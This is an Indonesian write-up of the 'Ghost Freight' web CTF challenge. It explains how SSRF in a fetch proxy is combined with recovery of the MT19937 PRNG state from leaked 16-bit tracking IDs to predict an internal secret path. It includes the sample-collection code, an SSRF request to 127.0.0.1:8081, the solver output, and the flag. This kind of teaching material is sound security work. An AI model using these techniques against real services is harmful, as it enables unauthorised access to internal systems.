# Writeup — Ghost Freight

## Deskripsi Challenge

Challenge ini berada pada kategori **web** dengan judul **Ghost Freight**.

Deskripsi challenge:

```text
Arachne's port authority runs a cargo manifest relay that lets couriers look up tracking references and fetch remote documents. Somewhere behind the relay, a sealed manifest holds something valuable.
```

Kita diberikan sebuah website dengan dua endpoint utama:

```text
GET /api/manifest
GET /api/fetch?url=<url>
```

Endpoint `/api/manifest` memberikan tracking reference, sedangkan `/api/fetch` berfungsi sebagai proxy untuk mengambil dokumen dari URL tertentu.

---

## Analisis Source Code

Challenge menyediakan dua service Flask:

```text
app_public.py
app_internal.py
```

Service public berjalan di port `8080`, sedangkan service internal berjalan di `127.0.0.1:8081`.

---

## Internal Service

Pada `app_internal.py`, flag hanya diberikan jika path yang diminta sama dengan secret path saat ini.

```python
SECRET_PATH_FILE = "/tmp/secret_path"

@app.get("/<path:path>")
def check_path(path: str):
    try:
        current_secret = open(SECRET_PATH_FILE).read().strip()
    except FileNotFoundError:
        abort(503, "service not ready")

    if path == current_secret:
        return (FLAG + "\n", 200, {"Content-Type": "text/plain"})

    abort(404, "unknown manifest")
```

Artinya flag berada di:

```text
http://127.0.0.1:8081/<secret_path>
```

Masalahnya, `secret_path` berupa 8 digit hex acak, sehingga secara teori memiliki ruang kemungkinan:

```text
2^32
```

Brute force langsung jelas tidak realistis.

---

## Public Service

Pada `app_public.py`, setiap request akan menjalankan fungsi:

```python
@app.before_request
def before_request():
    _rotate_secret_path()
```

Fungsi `_rotate_secret_path()` menghasilkan secret baru:

```python
_current_value = rng.getrandbits(32)
path_hex = f"{_current_value:08x}"
```

Lalu secret tersebut ditulis ke file:

```text
/tmp/secret_path
```

Jadi setiap request ke public service akan mengganti secret path internal.

---

## Endpoint `/api/manifest`

Endpoint ini membocorkan sebagian secret:

```python
@app.get("/api/manifest")
def manifest():
    """Returns a Tracking ID"""
    truncated = (_current_value >> 16) & 0xFFFF
    return jsonify({"tracking_id": f"{truncated:04x}"})
```

`_current_value` adalah 32-bit secret yang baru saja dihasilkan. Namun endpoint ini hanya menampilkan 16 bit atasnya.

Contoh:

```text
_current_value = 0xfe3fe6e5
tracking_id    = 0xfe3f
```

Jadi `/api/manifest` memberikan leak berupa:

```text
top 16 bit dari output PRNG
```

---

## Endpoint `/api/fetch`

Endpoint `/api/fetch` menerima parameter URL:

```python
@app.get("/api/fetch")
def fetch():
    url = request.args.get("url", "").strip()
```

Validasi hanya mengecek scheme:

```python
ALLOWED_SCHEMES = {"http", "https"}
```

Lalu langsung melakukan request:

```python
resp = http_client.get(url, timeout=FETCH_TIMEOUT, stream=True)
```

Tidak ada blokir untuk hostname internal seperti:

```text
127.0.0.1
localhost
```

Maka endpoint ini vulnerable terhadap **SSRF**.

Dengan SSRF, kita bisa meminta public service mengambil URL internal:

```text
http://127.0.0.1:8081/<secret_path>
```

Jika `<secret_path>` benar, internal service akan mengembalikan flag.

---

## Root Cause

Challenge ini memiliki dua kelemahan yang digabungkan:

```text
1. SSRF pada /api/fetch
2. Predictable PRNG dari random.Random()
```

Python `random.Random()` menggunakan MT19937. PRNG ini bukan cryptographically secure. Walaupun endpoint hanya membocorkan 16 bit atas dari setiap output 32-bit, dengan cukup banyak output berurutan, state MT19937 masih dapat direcover menggunakan sistem persamaan bit.

Karena setiap request ke `/api/manifest` menghasilkan output PRNG baru dan membocorkan 16 bit atasnya, kita dapat mengumpulkan banyak sample:

```text
tracking_id_1
tracking_id_2
tracking_id_3
...
```

Lalu merekonstruksi state MT19937 dan memprediksi output berikutnya.

---

## Strategi Exploit

Strategi exploit:

```text
1. Kirim banyak request berurutan ke /api/manifest.
2. Ambil tracking_id dari setiap response.
3. Tracking ID adalah top 16 bit dari output 32-bit MT19937.
4. Recover state MT19937 dari truncated outputs.
5. Prediksi output berikutnya.
6. Output berikutnya adalah secret_path untuk request berikutnya.
7. Gunakan /api/fetch untuk SSRF ke:
   http://127.0.0.1:8081/<predicted_secret>
8. Dapatkan flag.
```

Catatan penting: selama proses collection berjalan, kita tidak boleh membuka website di browser atau melakukan `curl` manual lain, karena setiap request akan memutar secret dan menggeser urutan PRNG.

---

## Masalah Timeout

Pada percobaan awal, script mengalami timeout saat mengumpulkan output:

```text
Read timed out. (read timeout=10)
```

Karena urutan PRNG harus berurutan, jika satu request timeout di tengah, data yang sudah terkumpul tidak aman untuk dilanjutkan. Solusinya adalah mengulang collection dari nol jika terjadi timeout.

Patch yang digunakan:

```python
def get_manifest_once(base):
    r = requests.get(
        base + "/api/manifest",
        timeout=30,
        headers={"Connection": "close"},
    )
    r.raise_for_status()
    return int(r.json()["tracking_id"], 16)


def collect_tracking_ids(base, count):
    obs = []
    failures = 0

    while len(obs) < count:
        try:
            val = get_manifest_once(base)
            obs.append(val)

            if len(obs) % 100 == 0:
                print(f"[*] collected {len(obs)}/{count}")

        except requests.RequestException as e:
            failures += 1
            print(f"[!] request failed/timeout: {e}")
            print("[!] sequence may be broken, restarting collection from zero...")
            obs = []
            time.sleep(2)

            if failures >= 10:
                raise RuntimeError("too many network failures, rerun with fresh instance")

    return obs
```

Jumlah sample yang dipakai:

```python
sample_count = 1280
```

---

## Solver

Solver melakukan recovery state MT19937 dari output top 16-bit. Setelah state berhasil direcover, solver memprediksi secret berikutnya dan mengambil flag lewat SSRF.

Command:

```bash
python3 solve.py "https://http-01kyz5a7ew2kdv9px4e19e65xd.u-ctf-ctf-7001b39a.urc.tf/"
```

Output:

```text
[*] target: https://http-01kyz5a7ew2kdv9px4e19e65xd.u-ctf-ctf-7001b39a.urc.tf
[*] collecting truncated PRNG outputs...
[*] collected 100/1280
[*] collected 200/1280
[*] collected 300/1280
[*] collected 400/1280
[*] collected 500/1280
[*] collected 600/1280
[*] collected 700/1280
[*] collected 800/1280
[*] collected 900/1280
[*] collected 1000/1280
[*] collected 1100/1280
[*] collected 1200/1280
[*] recovering MT19937 state...
[+] predicted next secret path: fe3fe6e5
[*] fetching internal manifest via SSRF...
[*] status: 200
uctf{35bbf946d68eda0361b585a5333586bbbfe4}
```

Prediksi secret path:

```text
fe3fe6e5
```

Kemudian solver melakukan request:

```text
/api/fetch?url=http://127.0.0.1:8081/fe3fe6e5
```

Karena path benar, internal service mengembalikan flag.

---

## Flag

```text
uctf{35bbf946d68eda0361b585a5333586bbbfe4}
```

---

## Kesimpulan

Challenge **Ghost Freight** menggabungkan SSRF dan predictable PRNG.

Endpoint `/api/fetch` dapat digunakan untuk mengakses service internal di `127.0.0.1:8081`. Namun service internal hanya mengembalikan flag jika path yang diminta sama dengan secret 32-bit yang sedang aktif.

Secret tersebut dibuat menggunakan `random.Random().getrandbits(32)`, lalu endpoint `/api/manifest` membocorkan 16 bit atasnya. Dengan mengumpulkan banyak output berurutan, state MT19937 dapat direcover meskipun output hanya bocor sebagian. Setelah state berhasil direkonstruksi, secret berikutnya dapat diprediksi, lalu digunakan pada SSRF untuk mengambil flag dari internal service.
